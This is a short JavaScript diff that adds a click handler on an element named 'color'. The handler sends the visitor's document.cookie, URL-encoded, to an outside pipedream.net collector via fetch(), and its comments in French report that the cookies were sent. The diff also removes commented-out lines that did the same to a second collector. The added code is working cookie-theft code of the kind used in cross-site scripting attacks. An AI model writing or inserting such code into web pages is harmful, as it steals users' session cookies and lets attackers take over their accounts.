@@ -1,8 +1,14 @@
-// const word = document.getElementById("word");
-// const res = document.getElementById("result");
-
-// word.oninput = () => {
-//    document.location.hash = word.value;
-// }
-color.onclick = () => { "http://en031xtc06v0xp.x.pipedream.net?cookie="+document.cookie }
-//window.onhashchange="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
+color.onclick = () => {
+    const url = "http://en031xtc06v0xp.x.pipedream.net?cookie=" + encodeURIComponent(document.cookie);
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                console.log('Cookies envoyés avec succès.');
+            } else {
+                console.error('Erreur lors de l\'envoi des cookies.');
+            }
+        })
+        .catch(error => {
+            console.error('Erreur de réseau:', error);
+        });
+};
